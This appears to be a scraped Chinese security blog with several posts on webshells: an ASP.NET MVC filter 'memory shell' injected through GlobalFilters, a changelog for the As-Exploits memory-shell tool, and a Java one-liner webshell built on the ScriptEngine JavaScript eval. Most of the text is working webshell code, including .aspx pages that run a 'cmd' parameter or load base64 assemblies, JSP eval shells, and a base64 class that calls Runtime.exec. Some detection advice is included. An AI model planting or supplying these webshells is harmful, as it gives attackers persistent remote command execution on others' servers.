Global.asax文件，这个文件会在web应用启动后首先执行。其中Codebehind指向了Global.asax.cs，在Global.asax.cs中可以看到，在asp.net mvc启动的时候，会默认去注册三个组件。 namespace WebApplication2 { public class MvcApplication : System.Web.HttpApplication { protected void Application_Start() { AreaRegistration.RegisterAllAreas();//注册 MVC 应用程序中的所有区域 FilterConfig.RegisterGlobalFilters(GlobalFilters.Filters);//注册filter RouteConfig.RegisterRoutes(RouteTable.Routes);//注册路由 BundleConfig.RegisterBundles(BundleTable.Bundles);//打包捆绑资源，对css以及js进行压缩 } } } 看下FilterConfig.RegisterGlobalFilters这个方法的作用，就是给全局GlobalFilterCollection里面加入我们自定义的filter逻辑。至于为什么不去看route，因为filter的优先级在route之前，当然是我们的第一选择。 namespace WebApplication2 { public class FilterConfig { public static void RegisterGlobalFilters(GlobalFilterCollection filters) { filters.Add(new HandleErrorAttribute()); } } } 内存马的本质是在容器中注入一段恶意代码，并且由于容器的特性，如filter，servlet等机制，使得每次收到web请求我们的恶意代码都会被执行。 在java中添加filter内存马较为麻烦，需要用反射从上下文中获取到filterMap等信息，然后向里面注入我们自定义的filter。但是在asp.net中，则直接将这个接口给用户暴露了出来。这就极大方便了我们注入内存马的操作。 看了下System.Web.Mvc.GlobalFilterCollection，从注释就可以看出来，这里存放了全局的filter。 ","date":"2021-12-18","objectID":"/posts/asp-net-memory-filter/:2:0","series":null,"tags":[],"title":"ASP.NET下的内存马(一)：filter内存马","uri":"/posts/asp-net-memory-filter/#aspnet-mvc结构"},{"categories":["技术文章"],"content":"\r3 filter类型那么应该打入什么类型的filter呢？翻了下文档，ASP.NET MVC 框架支持四种不同类型的筛选器： 授权筛选器 = 实现IAuthorizationFilter属性。 操作筛选器 = 实现IActionFilter属性。 结果筛选器 = 实现IResultFilter属性。 异常筛选器 = 实现IExceptionFilter属性。 筛选器按上面列出的顺序执行。 例如，授权筛选器始终在操作筛选器和异常筛选器始终在每一种其他类型的筛选器之后执行。 授权筛选器用于实现控制器操作的身份验证和授权。 例如，“授权\"筛选器是授权筛选器的示例。 操作筛选器包含在控制器操作执行之前和之后执行的逻辑。 例如，可以使用操作筛选器修改控制器操作返回的视图数据。 结果筛选器包含在执行视图结果之前和之后执行的逻辑。 例如，您可能希望在视图呈现给浏览器之前修改视图结果。 异常筛选器是要运行的最后一种筛选器类型。 可以使用异常筛选器来处理控制器操作或控制器操作结果引发的错误。 您还可以使用异常筛选器来记录错误。 每种不同类型的筛选器都按特定顺序执行。 如果要控制执行相同类型的筛选器的顺序，则可以设置筛选器的 Order 属性。 所有操作筛选器的基类是类System.Web.Mvc.FilterAttribute。 如果要实现特定类型的筛选器，则需要创建从基本筛选器类继承的类，并实现一个或多个IAuthorizationFilter、 IActionFilter、或IResultFilter``IExceptionFilter接口。 以上来自微软文档：https://docs.microsoft.com/zh-cn/aspnet/mvc/overview/older-versions-1/controllers-and-routing/understanding-action-filters-cs 作为攻击者来说，我们当然希望我们的内存马处于最高优先级的位置。所以就选择继承IAuthorizationFilter接口。 除此以外，类比java内存马，还要把我们的filter放到第一位的位置。 ","date":"2021-12-18","objectID":"/posts/asp-net-memory-filter/:3:0","series":null,"tags":[],"title":"ASP.NET下的内存马(一)：filter内存马","uri":"/posts/asp-net-memory-filter/#filter类型"},{"categories":["技术文章"],"content":"\r4 优先级问题在默认的System.Web.Mvc.GlobalFilterCollection.Add方法中可以看到，Add有两个重载方法，一个带order参数一个不带。最后调用AddInternal方法把我们的filter添加到类成员中。 查看System.Web.Mvc.Filter，发现默认的filter order是-1。那么为了提高我们的优先级，我们只需要把order设为一个小于-1的值即可。 这里有个小细节：仔细研究的同学会发现，Filter类的构造方法除了order参数还有一个scope参数，那么scope参数是干什么的呢？ 当有多个 Filter的时候，执行顺序由Order（int 类型）和 Scope（enum 类型，FilterScope）决定。其关键逻辑在FilterComparer中可以看到 总结一下就是： Order 和 FilterScope 的数值越小，过滤器的执行优先级越高 Order 比 FilterScope 具有更高的优先级，在Order属性值相同时FilterScope才会被考虑 ","date":"2021-12-18","objectID":"/posts/asp-net-memory-filter/:4:0","series":null,"tags":[],"title":"ASP.NET下的内存马(一)：filter内存马","uri":"/posts/asp-net-memory-filter/#优先级问题"},{"categories":["技术文章"],"content":"\r5 测试 \u003c%@ Page Language=\"c#\"%\u003e \u003c%@ Import Namespace=\"System.Diagnostics\" %\u003e \u003c%@ Import Namespace=\"System.Reflection\" %\u003e \u003c%@ Import Namespace=\"System.Web.Mvc\" %\u003e \u003cscript runat=\"server\"\u003e public class MyAuthFilter : IAuthorizationFilter { public void OnAuthorization(AuthorizationContext filterContext) { String cmd = filterContext.HttpContext.Request.QueryString[\"cmd\"]; if (cmd != null) { HttpResponseBase response = filterContext.HttpContext.Response; Process p = new Process(); p.StartInfo.FileName = cmd; p.StartInfo.UseShellExecute = false; p.StartInfo.RedirectStandardOutput = true; p.StartInfo.RedirectStandardError = true; p.Start(); byte[] data = Encoding.UTF8.GetBytes(p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd()); response.Write(System.Text.Encoding.Default.GetString(data)); } Console.WriteLine(\"auth filter inject\"); } } \u003c/script\u003e \u003c% GlobalFilterCollection globalFilterCollection = GlobalFilters.Filters; globalFilterCollection.Add(new MyAuthFilter(), -2); %\u003e 访问filter.aspx 注入内存马。一片空白表示注入成功 访问?cmd=calc弹出计算器 蚁剑连接 \u003c%@ Page Language=\"c#\"%\u003e \u003c%@ Import Namespace=\"System.Web.Mvc\" %\u003e \u003cscript runat=\"server\"\u003e public class MyAuthFilter : IAuthorizationFilter { public void OnAuthorization(AuthorizationContext filterContext) { HttpContext context = HttpContext.Current; String Payload = filterContext.HttpContext.Request.Params[\"ant\"]; if (Payload != null) { System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload)); assembly.CreateInstance(assembly.GetName().Name + \".Run\").Equals(context); context.Response.End(); } Console.WriteLine(\"auth filter inject\"); } } \u003c/script\u003e \u003c% GlobalFilterCollection globalFilterCollection = GlobalFilters.Filters; globalFilterCollection.Add(new MyAuthFilter(), -2); %\u003e ","date":"2021-12-18","objectID":"/posts/asp-net-memory-filter/:5:0","series":null,"tags":[],"title":"ASP.NET下的内存马(一)：filter内存马","uri":"/posts/asp-net-memory-filter/#测试"},{"categories":["技术文章"],"content":"\r6 检测内存马本人写了个小脚本 ASP.NET-Memshell-Scanner，可用于各类内存马的检测。 下载项目中的检测脚本 https://github.com/yzddmr6/ASP.NET-Memshell-Scanner/blob/master/aspx-memshell-scanner.aspx，放到网站目录下，浏览器访问。 根据名称可以看到类型为 ASP.shell_filter2_aspx+MyAuthFilter的filter较为可疑。 如果想要实锤怎么操作？ 根据CodeBase地址找到编译后的aspx文件，用dnspy等反编译工具打开。 找到对应的具体类shell_filter2_aspx#MyAuthFilter，可以看到其中内容确实为恶意代码。 ","date":"2021-12-18","objectID":"/posts/asp-net-memory-filter/:6:0","series":null,"tags":[],"title":"ASP.NET下的内存马(一)：filter内存马","uri":"/posts/asp-net-memory-filter/#检测内存马"},{"categories":["技术文章"],"content":"\r7 总结根据本人的研究，aspx必须访问一个真实存在的url时才会触发filter，而非像java一样filter可以用/*直接匹配任意路径。 除此之外，java的filter是责任链模式，必须要显式声明chain.doFilter才会走到下一个filter。如果jb小子一时手抖忘了写这句代码，打进内存马后就会造成网站的正常业务无法访问。但是.net没有这种机制。不需要做额外声明即可按顺序调用各个filter。 本文提到的filter内存马必须依赖于system.web.mvc.dll这个东西，也就是只能在.net mvc下使用。那么有没有其他的内存马，可以仅依靠.net framework就可以执行呢？等我下篇文章讲一讲。 ","date":"2021-12-18","objectID":"/posts/asp-net-memory-filter/:7:0","series":null,"tags":[],"title":"ASP.NET下的内存马(一)：filter内存马","uri":"/posts/asp-net-memory-filter/#总结"},{"categories":["技术文章"],"content":"\r8 参考文章https://www.cnblogs.com/RobbinHan/archive/2011/11/29/2268076.html https://docs.microsoft.com/zh-cn/aspnet/mvc/overview/older-versions-1/controllers-and-routing/understanding-action-filters-cs https://mp.weixin.qq.com/s/cm8pPAw7dZ-iMb4LvVXAlQ ","date":"2021-12-18","objectID":"/posts/asp-net-memory-filter/:8:0","series":null,"tags":[],"title":"ASP.NET下的内存马(一)：filter内存马","uri":"/posts/asp-net-memory-filter/#参考文章"},{"categories":null,"content":"\rJava WebShell攻防下的黑魔法\r2022补天白帽大会\r阅读全文\rJava表达式攻防下的黑魔法\r2023 KCON\r阅读全文\r","date":"2021-11-01","objectID":"/showcase/:0:0","series":null,"tags":null,"title":"议题","uri":"/showcase/#"},{"categories":["技术文章"],"content":"\r1 更新日志","date":"2021-07-25","objectID":"/posts/as-exploits-v14-update/:1:0","series":null,"tags":[],"title":"As-Exploits v1.4更新","uri":"/posts/as-exploits-v14-update/#更新日志"},{"categories":["技术文章"],"content":"\r1.1 v 1.4 (2021/7/24) aspx新增 内存马 模块 aspx新增 内存马管理 模块 jsp新增filter内存马 jsp内存马管理模块增强，支持filter、servlet（thx: tomcat-memshell-killer项目） 新增 执行自定义payload 模块 解决html渲染中文乱码 ","date":"2021-07-25","objectID":"/posts/as-exploits-v14-update/:1:1","series":null,"tags":[],"title":"As-Exploits v1.4更新","uri":"/posts/as-exploits-v14-update/#v-14-2021724"},{"categories":["技术文章"],"content":"\r2 JSP内存马模块增强","date":"2021-07-25","objectID":"/posts/as-exploits-v14-update/:2:0","series":null,"tags":[],"title":"As-Exploits v1.4更新","uri":"/posts/as-exploits-v14-update/#jsp内存马模块增强"},{"categories":["技术文章"],"content":"\r2.1 filter内存马新增filter类型内存马。内存马会把自己放到filter的第一位，在遇到shiro框架的时候就不用填写登录Cookie了。 默认支持Tomcat以及Spring。 ","date":"2021-07-25","objectID":"/posts/as-exploits-v14-update/:2:1","series":null,"tags":[],"title":"As-Exploits v1.4更新","uri":"/posts/as-exploits-v14-update/#filter内存马"},{"categories":["技术文章"],"content":"\r2.2 内存马管理内存马管理模块核心payload移植了tomcat-memshell-killer的代码，是不是看起来更直观了？ 还可以贴心的判断有没有其他人的内存马 卸载内存马填入Filter name即可 ","date":"2021-07-25","objectID":"/posts/as-exploits-v14-update/:2:2","series":null,"tags":[],"title":"As-Exploits v1.4更新","uri":"/posts/as-exploits-v14-update/#内存马管理"},{"categories":["技术文章"],"content":"\r3 ASPX内存马","date":"2021-07-25","objectID":"/posts/as-exploits-v14-update/:3:0","series":null,"tags":[],"title":"As-Exploits v1.4更新","uri":"/posts/as-exploits-v14-update/#aspx内存马"},{"categories":["技术文章"],"content":"\r3.1 内存马注入aspx内存马的核心代码来源于ysoserial.net的GhostWebShell，三好学生的博客中也有提到：https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%88%A9%E7%94%A8%E8%99%9A%E6%8B%9F%E6%96%87%E4%BB%B6%E9%9A%90%E8%97%8FASP.NET-Webshell 主要原理是利用了asp.net下虚拟文件的特性 通过ASP.NET的VirtualPathProvider类能够创建虚拟文件，实现以下效果：虚拟文件不存在于服务器的文件系统，但是能够对其动态编译并提供访问服务。ysoserial.net的GhostWebShell.cs提供了一种可供学习的利用思路。 可以直接定义要注入的shell内容，默认为普通一句话，当然也可以改成冰蝎哥斯拉之类的 连接的时候可以把注入的路径后面加点随机字符串，当作一个文件 也可以把注入的路径当作一个目录，在目录下面填写随机文件名 要注意的是必须要用.aspx结尾，因为映射的是一个文件，所以要用指定的后缀才能解析。 暂时不支持通配符模式 ","date":"2021-07-25","objectID":"/posts/as-exploits-v14-update/:3:1","series":null,"tags":[],"title":"As-Exploits v1.4更新","uri":"/posts/as-exploits-v14-update/#内存马注入"},{"categories":["技术文章"],"content":"\r3.2 内存马管理内存马注入的payload大部分是抄的 内存马管理部分的payload主要是自己手搓的。研究一下发现VirtualPathProvider主要用到了类似单向链表的结构，不像Tomcat的内存马有一个Config去定义。获取所有组件需要遍历链表，卸载的时候需要修改当前指针指向来删除节点，梦回数据结构课堂。 卸载指定VPP 再次获取组件发现内存马已经被删除。 剩下的这个System.Web.Hosting.MapPathBasedVirtualPathProvider是IIS默认组件，删除之后网站会崩，请慎重操作。 ","date":"2021-07-25","objectID":"/posts/as-exploits-v14-update/:3:2","series":null,"tags":[],"title":"As-Exploits v1.4更新","uri":"/posts/as-exploits-v14-update/#内存马管理-1"},{"categories":["技术文章"],"content":"\r4 自定义脚本执行这个功能主要是为了方便调试 在JSP下需要填写base64格式的编译后的class文件 格式按照https://github.com/AntSwordProject/AntSword-JSP-Template项目去编写即可，这里以baseinfo为例： ","date":"2021-07-25","objectID":"/posts/as-exploits-v14-update/:4:0","series":null,"tags":[],"title":"As-Exploits v1.4更新","uri":"/posts/as-exploits-v14-update/#自定义脚本执行"},{"categories":["技术文章"],"content":"\r4.1 aspxaspx下就直接写jscript代码即可 如果想要调用C#的payload看我博客这篇文章：https://yzddmr6.tk/posts/jscript-load-csharp-assembly/ ","date":"2021-07-25","objectID":"/posts/as-exploits-v14-update/:4:1","series":null,"tags":[],"title":"As-Exploits v1.4更新","uri":"/posts/as-exploits-v14-update/#aspx"},{"categories":["技术文章"],"content":"\r4.2 php直接写php代码 ","date":"2021-07-25","objectID":"/posts/as-exploits-v14-update/:4:2","series":null,"tags":[],"title":"As-Exploits v1.4更新","uri":"/posts/as-exploits-v14-update/#php"},{"categories":["技术文章"],"content":"\r5 项目地址https://github.com/yzddmr6/As-Exploits ","date":"2021-07-25","objectID":"/posts/as-exploits-v14-update/:5:0","series":null,"tags":[],"title":"As-Exploits v1.4更新","uri":"/posts/as-exploits-v14-update/#项目地址"},{"categories":["技术文章"],"content":" 本文首发于先知社区 ","date":"2021-06-19","objectID":"/posts/a-new-type-java-webshell/:0:0","series":null,"tags":[],"title":"一种新型Java一句话木马的实现","uri":"/posts/a-new-type-java-webshell/#"},{"categories":["技术文章"],"content":"\r1 前言一直以来，Java一句话木马都是采用打入字节码defineClass实现的。这种方法的优势是可以完整的打进去一个类，可以几乎实现Java上的所有功能。不足之处就是Payload过于巨大，并且不像脚本语言一样方便修改。并且还存在很多特征，例如继承ClassLoader，反射调用defineClass等。本人在这里提出一种新型Java一句话木马：利用Java中JS引擎实现的一句话木马。 ","date":"2021-06-19","objectID":"/posts/a-new-type-java-webshell/:1:0","series":null,"tags":[],"title":"一种新型Java一句话木马的实现","uri":"/posts/a-new-type-java-webshell/#前言"},{"categories":["技术文章"],"content":"\r2 基本原理 Java没有eval函数，Js有eval函数，可以把字符串当代码解析。 Java从1.6开始自带ScriptEngineManager这个类，原生支持调用js，无需安装第三方库。 ScriptEngine支持在Js中调用Java的对象。 综上所述，我们可以利用Java调用JS引擎的eval，然后在Payload中反过来调用Java对象，这就是本文提出的新型Java一句话的核心原理。 ScriptEngineManager全名javax.script.ScriptEngineManager，从Java 6开始自带。其中Java 6/7采用的js解析引擎是Rhino，而从java8开始换成了Nashorn。不同解析引擎对同样的代码有一些差别，这点后面有所体现。 如果说原理其实一两句话就可以说清楚，但是难点在于Payload的编写。跨语言调用最大的一个难点就是数据类型以及方法的转换。例如Java中有byte数组，Js中没有怎么办？C++里有指针但是Java里没有这个玩意怎么办？ 在实现期间踩了很多的坑，这篇文章跟大家一起掰扯掰扯，希望能给大家提供点帮助。 ","date":"2021-06-19","objectID":"/posts/a-new-type-java-webshell/:2:0","series":null,"tags":[],"title":"一种新型Java一句话木马的实现","uri":"/posts/a-new-type-java-webshell/#基本原理"},{"categories":["技术文章"],"content":"\r2.1 获取脚本引擎 //通过脚本名称获取： ScriptEngine engine = new ScriptEngineManager().getEngineByName(\"JavaScript\"); //简写为js也可以 //通过文件扩展名获取： ScriptEngine engine = new ScriptEngineManager().getEngineByExtension(\"js\"); //通过MIME类型来获取： ScriptEngine engine = new ScriptEngineManager().getEngineByMimeType(\"text/javascript\"); ","date":"2021-06-19","objectID":"/posts/a-new-type-java-webshell/:2:1","series":null,"tags":[],"title":"一种新型Java一句话木马的实现","uri":"/posts/a-new-type-java-webshell/#获取脚本引擎"},{"categories":["技术文章"],"content":"\r2.2 绑定对象 ScriptEngine engine = new ScriptEngineManager().getEngineByName(\"js\"); engine.put(\"request\", request); engine.put(\"response\", response); engine.eval(request.getParameter(\"mr6\")); 或者通过eval的重载函数，直接把对象通过一个HashMap放进去 new javax.script.ScriptEngineManager().getEngineByName(\"js\").eval(request.getParameter(\"ant\"), new javax.script.SimpleBindings(new java.util.HashMap() {{ put(\"response\", response); put(\"request\", request); }})) ","date":"2021-06-19","objectID":"/posts/a-new-type-java-webshell/:2:2","series":null,"tags":[],"title":"一种新型Java一句话木马的实现","uri":"/posts/a-new-type-java-webshell/#绑定对象"},{"categories":["技术文章"],"content":"\r2.3 eval综合上面两步，有很多种写法，例如： shell.jsp \u003c% javax.script.ScriptEngine engine = new javax.script.ScriptEngineManager().getEngineByName(\"js\"); engine.put(\"request\", request); engine.put(\"response\", response); engine.eval(request.getParameter(\"mr6\")); %\u003e 或者直接缩写成一句： \u003c% new javax.script.ScriptEngineManager().getEngineByName(\"js\").eval(request.getParameter(\"mr6\"), new javax.script.SimpleBindings(new java.util.HashMap() {{ put(\"response\", response); put(\"request\", request); }})); %\u003e 以执行命令为例： POST：mr6=java.lang.Runtime.getRuntime().exec(“calc”); 即可达到命令执行的效果。 ","date":"2021-06-19","objectID":"/posts/a-new-type-java-webshell/:2:3","series":null,"tags":[],"title":"一种新型Java一句话木马的实现","uri":"/posts/a-new-type-java-webshell/#eval"},{"categories":["技术文章"],"content":"\r3 基本语法翻阅文档比较枯燥，这里挑一些用到的说一说。 感兴趣的同学也可以看一下原文档：https://docs.oracle.com/en/java/javase/12/scripting/java-scripting-programmers-guide.pdf ","date":"2021-06-19","objectID":"/posts/a-new-type-java-webshell/:3:0","series":null,"tags":[],"title":"一种新型Java一句话木马的实现","uri":"/posts/a-new-type-java-webshell/#基本语法"},{"categories":["技术文章"],"content":"\r3.1 调用Java方法前面加上全限定类名即可 var s = [3]; s[0] = \"cmd\"; s[1] = \"/c\"; s[2] = \"whoami\";//yzddmr6 var p = java.lang.Runtime.getRuntime().exec(s); var sc = new java.util.Scanner(p.getInputStream(),\"GBK\").useDelimiter(\"\\\\A\"); var result = sc.hasNext() ? sc.next() : \"\"; sc.close(); ","date":"2021-06-19","objectID":"/posts/a-new-type-java-webshell/:3:1","series":null,"tags":[],"title":"一种新型Java一句话木马的实现","uri":"/posts/a-new-type-java-webshell/#调用java方法"},{"categories":["技术文章"],"content":"\r3.2 导入Java类型 var Vector = java.util.Vector; var JFrame = Packages.javax.swing.JFrame; //这种写法仅仅支持Nashorn，Rhino并不支持 var Vector = Java.type(\"java.util.Vector\") var JFrame = Java.type(\"javax.swing.JFrame\") ","date":"2021-06-19","objectID":"/posts/a-new-type-java-webshell/:3:2","series":null,"tags":[],"title":"一种新型Java一句话木马的实现","uri":"/posts/a-new-type-java-webshell/#导入java类型"},{"categories":["技术文章"],"content":"\r3.3 创建Java类型的数组 // Rhino var Array = java.lang.reflect.Array var intClass = java.lang.Integer.TYPE var array = Array.newInstance(intClass, 8) // Nashorn var IntArray = Java.type(\"int[]\") var array = new IntArray(8) ","date":"2021-06-19","objectID":"/posts/a-new-type-java-webshell/:3:3","series":null,"tags":[],"title":"一种新型Java一句话木马的实现","uri":"/posts/a-new-type-java-webshell/#创建java类型的数组"},{"categories":["技术文章"],"content":"\r3.4 导入Java类默认情况下，Nashorn 不会导入Java的包。这样主要为了避免类型冲突，比如你写了一个new String，引擎怎么知道你new的是Java的String还是js的String？所以所有的Java的调用都需要加上全限定类名。但是这样写起来很不方便。 这个时候大聪明Mozilla Rhino 就想了一个办法，整了个扩展文件，里面提供了importClass 跟importPackage 方法，可以导入指定的Java包。 importClass 导入指定Java的类，现在推荐用Java.type importPackage 导入一个Java包，类似import com.yzddmr6.*，现在推荐用JavaImporter 这里需要注意的是，Rhino对该语法的错误处理机制，当被访问的类存在时，Rhino加载该class，而当其不存在时，则把它当成package名称，而并不会报错。 load(\"nashorn:mozilla_compat.js\"); importClass(java.util.HashSet); var set = new HashSet(); importPackage(java.util); var list = new ArrayList(); 在一些特殊情况下，导入的全局包会影响js中的函数，例如类名冲突。这个时候可以用JavaImporter，并配合with语句，对导入的Java包设定一个使用范围。 // create JavaImporter with specific packages and classes to import var SwingGui = new JavaImporter(javax.swing, javax.swing.event, javax.swing.border, java.awt.event); with (SwingGui) { // 在with里面才可以调用swing里面的类，防止污染 var mybutton = new JButton(\"test\"); var myframe = new JFrame(\"test\"); } ","date":"2021-06-19","objectID":"/posts/a-new-type-java-webshell/:3:4","series":null,"tags":[],"title":"一种新型Java一句话木马的实现","uri":"/posts/a-new-type-java-webshell/#导入java类"},{"categories":["技术文章"],"content":"\r3.5 方法调用与重载方法在JavaScript中实际上是对象的一个属性，所以除了使用 . 来调用方法之外，也可以使用[]来调用方法： var System = Java.type('java.lang.System'); System.out.println('Hello, World'); // Hello, World System.out['println']('Hello, World'); // Hello, World Java支持重载（Overload）方法，例如，System.out 的 println 有多个重载版本，如果你想指定特定的重载版本，可以使用[]指定参数类型。例如： var System = Java.type('java.lang.System'); System.out['println'](3.14); // 3.14 System.out['println(double)'](3.14); // 3.14 System.out['println(int)'](3.14); // 3 ","date":"2021-06-19","objectID":"/posts/a-new-type-java-webshell/:3:5","series":null,"tags":[],"title":"一种新型Java一句话木马的实现","uri":"/posts/a-new-type-java-webshell/#方法调用与重载"},{"categories":["技术文章"],"content":"\r4 Payload结构设计详情写在注释里了 //导入基础拓展 try { load(\"nashorn:mozilla_compat.js\"); } catch (e) {} //导入常见包 importPackage(Packages.java.util); importPackage(Packages.java.lang); importPackage(Packages.java.io); var output = new StringBuffer(\"\"); //输出 var cs = \"${jspencode}\"; //设置字符集编码 var tag_s = \"${tag_s}\"; //开始符号 var tag_e = \"${tag_e}\"; //结束符号 try { response.setContentType(\"text/html\"); request.setCharacterEncoding(cs); response.setCharacterEncoding(cs); function decode(str) { //参数解码 str = str.substr(2); var bt = Base64DecodeToByte(str); return new java.lang.String(bt, cs); } function Base64DecodeToByte(str) { importPackage(Packages.sun.misc); importPackage(Packages.java.util); var bt; try { bt = new BASE64Decoder().decodeBuffer(str); } catch (e) { bt = Base64.getDecoder().decode(str); } return bt; } function asoutput(str) { //回显加密 return str; } function func(z1) { //eval function return z1; } output.append(func(z1)); //添加功能函数回显 } catch (e) { output.append(\"ERROR:// \" + e.toString()); //输出错误 } try { response.getWriter().print(tag_s + asoutput(output.toString()) + tag_e); //回显 } catch (e) {} ","date":"2021-06-19","objectID":"/posts/a-new-type-java-webshell/:4:0","series":null,"tags":[],"title":"一种新型Java一句话木马的实现","uri":"/posts/a-new-type-java-webshell/#payload结构设计"},{"categories":["技术文章"],"content":"\r5 语法问题的坑","date":"2021-06-19","objectID":"/posts/a-new-type-java-webshell/:5:0","series":null,"tags":[],"title":"一种新型Java一句话木马的实现","uri":"/posts/a-new-type-java-webshell/#语法问题的坑"},{"categories":["技术文章"],"content":"\r5.1 两种语言对象间的相互转换要注意的是，在遇到Java跟JS可能存在类型冲突的地方，即使导入了包也要加上全限定类名。 在编写payload的时候被坑了很久的一个问题就是，在导入java.lang以后写new String(bt,cs)没有加全限定类名，导致打印出来的一直是一个字符串地址。 正确的操作是new java.lang.String(bt,cs)。因为在Java和Js中均存在String类，按照优先级，直接new出来的会是Js的对象。 下面附上类型对比表： JavaScript Value JavaScript Type Java Type Is Scriptable Is Function {a:1, b:[‘x’,‘y’]} object org.mozilla.javascript.NativeObject + - [1,2,3] object org.mozilla.javascript.NativeArray + - 1 number java.lang.Double - - 1.2345 number java.lang.Double - - NaN number java.lang.Double - - Infinity number java.lang.Double - - -Infinity number java.lang.Double - - true boolean java.lang.Boolean - - “test” string java.lang.String - - null object null - - undefined undefined org.mozilla.javascript.Undefined - - function () { } function org.mozilla.javascript.gen.c1 + + /.*/ object org.mozilla.javascript.regexp.NativeRegExp + + ","date":"2021-06-19","objectID":"/posts/a-new-type-java-webshell/:5:1","series":null,"tags":[],"title":"一种新型Java一句话木马的实现","uri":"/posts/a-new-type-java-webshell/#两种语言对象间的相互转换"},{"categories":["技术文章"],"content":"\r5.2 Rhino/Nashorn解析的差异这也是当时一个坑点，看下面一段代码 var readonlyenv = System.getenv(); var cmdenv = new java.util.HashMap(readonlyenv); var envs = envstr.split(\"\\\\|\\\\|\\\\|asline\\\\|\\\\|\\\\|\"); for (var i = 0; i \u003c envs.length; i++) { var es = envs[i].split(\"\\\\|\\\\|\\\\|askey\\\\|\\\\|\\\\|\"); if (es.length == 2) { cmdenv.put(es[0], es[1]); } } var e = []; var i = 0; print(cmdenv+'\\n'); for (var key in cmdenv) {//关键 print(\"key: \"+key+\"\\n\"); e[i] = key + \"=\" + cmdenv[key]; i++; } 其中cmdenv是个HashMap，这段代码在Java 8中Nashorn引擎可以正常解析，var key in cmdenv的时候把cmdenv的键给输出了 但是在Java 6下运行时，Rhino把他当成了一个js对象，把其属性输出了 所以涉及到这种混合写法就会有异议，不同的引擎有不同的解释。 解决办法使用Java迭代器即可，不掺杂js的写法。 var i = 0; var iter = cmdenv.keySet().iterator(); while (iter.hasNext()) { var key = iter.next(); var val = cmdenv.get(key); //print(\"\\nkey:\" + key); //print(\"\\nval:\" + val); e[i] = key + \"=\" + val; i++; } ","date":"2021-06-19","objectID":"/posts/a-new-type-java-webshell/:5:2","series":null,"tags":[],"title":"一种新型Java一句话木马的实现","uri":"/posts/a-new-type-java-webshell/#rhinonashorn解析的差异"},{"categories":["技术文章"],"content":"\r5.3 反射的坑在Java中，如果涉及到不同版本之间类的包名不一样，我们通常不能直接导入，而要使用反射的写法。 例如base64解码的时候，Java的写法如下 public byte[] Base64DecodeToByte(String str) { byte[] bt = null; String version = System.getProperty(\"java.version\"); try { if (version.compareTo(\"1.9\") \u003e= 0) { Class clazz = Class.forName(\"java.util.Base64\"); Object decoder = clazz.getMethod(\"getDecoder\").invoke(null); bt = (byte[]) decoder.getClass().getMethod(\"decode\", String.class).invoke(decoder, str); } else { Class clazz = Class.forName(\"sun.misc.BASE64Decoder\"); bt = (byte[]) clazz.getMethod(\"decodeBuffer\", String.class).invoke(clazz.newInstance(), str); } return bt; } catch (Exception e) { return new byte[]{}; } } 改写成js风格后，发现会有一些奇奇怪怪的BUG。（后来发现反射其实也可以实现，导入Java类型然后再传入反射参数即可，就是比较麻烦） function test(str) { var bt = null; var version = System.getProperty(\"java.version\"); if (version.compareTo(\"1.9\") \u003e= 0) { var clazz = java.lang.Class.forName(\"java.util.Base64\"); var decoder = clazz.getMethod(\"getDecoder\").invoke(null); bt = decoder .getClass() .getMethod(\"decode\", java.lang.String.class) .invoke(decoder, str); } else { var clazz = java.lang.Class.forName(\"sun.misc.BASE64Decoder\"); bt = clazz .getMethod(\"decodeBuffer\", java.lang.String.class) .invoke(clazz.newInstance(), str); } return bt; } 但是在Js中，我们并不需要这么麻烦。上面提到过如果importPackage了一个不存在的包名，Js引擎会将这个错误给忽略，并且由于Js松散的语言特性，我们仅仅需要正射+异常捕获就可以完成目的。大大减小了payload编写的复杂度。 function Base64DecodeToByte(str) { importPackage(Packages.sun.misc); importPackage(Packages.java.util); var bt; try { bt = new BASE64Decoder().decodeBuffer(str); } catch (e) { bt = Base64.getDecoder().decode(str); } return bt; } ","date":"2021-06-19","objectID":"/posts/a-new-type-java-webshell/:5:3","series":null,"tags":[],"title":"一种新型Java一句话木马的实现","uri":"/posts/a-new-type-java-webshell/#反射的坑"},{"categories":["技术文章"],"content":"\r6 保底操作理论上，我们可以用js引擎的一句话实现所有字节码一句话的功能，退一万步讲，如果有些功能实在不好实现，或者说想套用现有的payload应该怎么办呢。 我们可以用java调用js后，再调用defineClass来实现： 编写一个命令执行的类：calc.java import java.io.IOException; public class calc { public calc(String cmd){ try { Runtime.getRuntime().exec(cmd); } catch (IOException e) { e.printStackTrace(); } } } 编译之后base64一下 \u003e base64 -w 0 calc.class yv66vgAAADQAKQoABwAZCgAaABsKABoAHAcAHQoABAAeBwAfBwAgAQAGPGluaXQ+AQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAAR0aGlzAQAGTGNhbGM7AQADY21kAQASTGphdmEvbGFuZy9TdHJpbmc7AQANU3RhY2tNYXBUYWJsZQcAHwcAIQcAHQEAClNvdXJjZUZpbGUBAAljYWxjLmphdmEMAAgAIgcAIwwAJAAlDAAmACcBABNqYXZhL2lvL0lPRXhjZXB0aW9uDAAoACIBAARjYWxjAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TdHJpbmcBAAMoKVYBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAPcHJpbnRTdGFja1RyYWNlACEABgAHAAAAAAABAAEACAAJAAEACgAAAIgAAgADAAAAFSq3AAG4AAIrtgADV6cACE0stgAFsQABAAQADAAPAAQAAwALAAAAGgAGAAAABAAEAAYADAAJAA8ABwAQAAgAFAAKAAwAAAAgAAMAEAAEAA0ADgACAAAAFQAPABAAAAAAABUAEQASAAEAEwAAABMAAv8ADwACBwAUBwAVAAEHABYEAAEAFwAAAAIA 填入下方payload try { load(\"nashorn:mozilla_compat.js\"); } catch (e) {} importPackage(Packages.java.util); importPackage(Packages.java.lang); importPackage(Packages.java.io); var output = new StringBuffer(\"\"); var cs = \"UTF-8\"; response.setContentType(\"text/html\"); request.setCharacterEncoding(cs); 